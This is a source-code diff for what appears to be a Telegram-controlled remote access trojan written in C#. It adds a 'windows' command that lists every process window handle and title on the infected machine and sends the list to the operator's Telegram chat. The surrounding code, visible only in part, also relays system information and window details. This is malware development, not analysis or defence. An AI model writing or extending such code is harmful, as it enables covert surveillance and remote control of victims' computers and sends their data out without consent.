@@ -1027,7 +1027,7 @@ namespace TelegramRAT
                                 }
 
                                 Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
-                                
+
                                 string info =
                                 "Window info\n" +
                                 "\n" +
@@ -1975,6 +1975,41 @@ namespace TelegramRAT
 
 
                     Bot.SendTextMessageAsync(model.Message.Chat.Id, sysInfo, replyToMessageId: model.Message.MessageId);
+                }
+            });
+
+            //GET WINDOWS
+            CommandsList.Add(new BotCommand
+            {
+                Command = "windows",
+
+                Description = "Show list of windows retrieved with all processes, a couple of them could belong to system.",
+
+                Execute = model =>
+                {
+                    Task.Run(() =>
+                    {
+                        try
+                        {
+                            Process[] processes = Process.GetProcesses();
+
+                            StringBuilder windowsList = new StringBuilder();
+
+                            foreach (Process proc in processes)
+                            {
+                                if (proc.MainWindowHandle != IntPtr.Zero)
+                                {
+                                    windowsList.AppendLine($"Handle: <code>0x{proc.MainWindowHandle.ToString("X")}</code> Title: {proc.MainWindowTitle}");
+                                }
+                            }
+
+                            Bot.SendTextMessageAsync(model.Message.Chat.Id, windowsList.ToString(), ParseMode.Html, replyToMessageId: model.Message.MessageId);
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(model.Message, ex);
+                        }
+                    });
                 }
             });
 
